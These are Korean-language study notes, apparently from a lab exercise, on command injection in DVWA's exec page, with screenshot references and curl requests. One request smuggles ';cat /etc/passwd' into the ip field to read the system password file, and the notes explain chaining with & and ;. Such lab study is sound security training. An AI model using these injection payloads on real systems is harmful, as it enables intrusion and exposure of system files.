
![[Pasted image 20241007101403.png]]![[Pasted image 20241007101546.png]]
![[Pasted image 20241007101703.png]]
위와 같은 구조일때 ''안에 들어갈 명령어를 원하는 명령어로 바꾼다면 실행이 가능할 것 같다.

![[Pasted image 20241007101759.png]]

- &: 둘 이상의 명령어를 연결할 때 사용하는 기호를 사용해 injection 
![[Pasted image 20241007102020.png]]
ping 명령어 실행 후 입력한 명령어 실행

192.168.56.000 = ping -c 4 192.168.56.000


`curl --cookie "PHPSESSID=aqsgn666ja2jubcdvc40euees2; security=low" http://192.168.56.118/vulnerabilities/exec/ --data "ip=-c 2 192.168.56.102&Submit=Submit"`
![[Pasted image 20241007103120.png]]
ip 라는 곳에 명령어를 저장하게되고 Submit 버튼을 누르는 것을 확인
![[Pasted image 20241007102918.png]]
`curl --cookie "PHPSESSID=aqsgn666ja2jubcdvc40euees2; security=low" http://192.168.56.118/vulnerabilities/exec/ --data "ip=-c 2 192.168.56.102;cat /etc/passwd&Submit=Submit"`
![[Pasted image 20241007103404.png]]
; 순차 실행
& 백그라운드(랜덤) 실행

소스 형태
![[Pasted image 20241007103614.png]]
- ip : 프록시 툴을 활용해 변수 이름 확인 가능
- 어떤 명령어든 검사 없이 cmd에